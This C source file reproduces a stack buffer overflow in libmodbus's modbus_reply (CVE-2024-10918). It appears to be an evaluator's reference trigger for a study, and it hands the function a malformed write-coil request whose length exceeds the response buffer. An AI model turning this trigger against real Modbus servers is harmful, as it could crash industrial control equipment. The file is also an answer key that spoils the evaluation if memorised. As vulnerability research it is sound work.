/* Deterministic reproduction of CVE-2024-10918 (libmodbus <= v3.1.10).
 *
 * EVALUATOR / BASELINE REPRODUCTION. This is the reference trigger for the
 * known historical bug. Whoever runs the human-only (Track A) investigation
 * should discover an equivalent input themselves rather than read this file.
 *
 * modbus_reply() copies an attacker-controlled request length into a fixed
 * stack buffer `uint8_t rsp[MAX_MESSAGE_LENGTH]` (MAX_MESSAGE_LENGTH == 260
 * for the TCP backend) in the WRITE_SINGLE_COIL / WRITE_SINGLE_REGISTER paths,
 * with no check that the request length matches the expected response length.
 * Passing a request longer than 260 bytes overflows the stack buffer; built
 * with -fsanitize=address this aborts with a stack-buffer-overflow report.
 *
 * Only public libmodbus API is used. This mirrors the upstream fix's own test,
 * which injects a wrong length for a single-coil write into modbus_reply.
 */
#include <modbus.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

/* Larger than the TCP backend's MAX_MESSAGE_LENGTH (260). */
#define OVERLONG_REQUEST_LEN 300

int main(void)
{
    modbus_t *ctx = modbus_new_tcp("127.0.0.1", 1502);
    if (ctx == NULL) {
        fprintf(stderr, "modbus_new_tcp failed\n");
        return 2;
    }
    /* Server data model: 500 of each, so our target address is valid. */
    modbus_mapping_t *mb = modbus_mapping_new(500, 500, 500, 500);
    if (mb == NULL) {
        fprintf(stderr, "modbus_mapping_new failed\n");
        modbus_free(ctx);
        return 2;
    }

    /* Craft a WRITE_SINGLE_COIL (function 0x05) request over the TCP backend.
     * MBAP header is 7 bytes: txn id (2), protocol id (2), length (2), unit (1).
     * Then: function (1), address (2), value (2). */
    uint8_t req[600];
    memset(req, 0, sizeof(req));
    req[0] = 0x00; req[1] = 0x01;   /* transaction id                        */
    req[2] = 0x00; req[3] = 0x00;   /* protocol id (Modbus)                  */
    req[4] = 0x01; req[5] = 0x26;   /* length field (overstated; unused here)*/
    req[6] = 0xFF;                  /* unit id                               */
    req[7] = 0x05;                  /* function: WRITE_SINGLE_COIL           */
    req[8] = 0x00; req[9] = 0x00;   /* address 0 (valid in our mapping)      */
    req[10] = 0xFF; req[11] = 0x00; /* value 0xFF00 == ON (passes data check)*/

    fprintf(stderr,
            "calling modbus_reply with req_length=%d into a 260-byte rsp buffer...\n",
            OVERLONG_REQUEST_LEN);

    /* The vulnerable call: memcpy(rsp, req, req_length) overflows rsp[260]. */
    modbus_reply(ctx, req, OVERLONG_REQUEST_LEN, mb);

    printf("NO CRASH (patched build or check present)\n");
    modbus_mapping_free(mb);
    modbus_free(ctx);
    return 0;
}
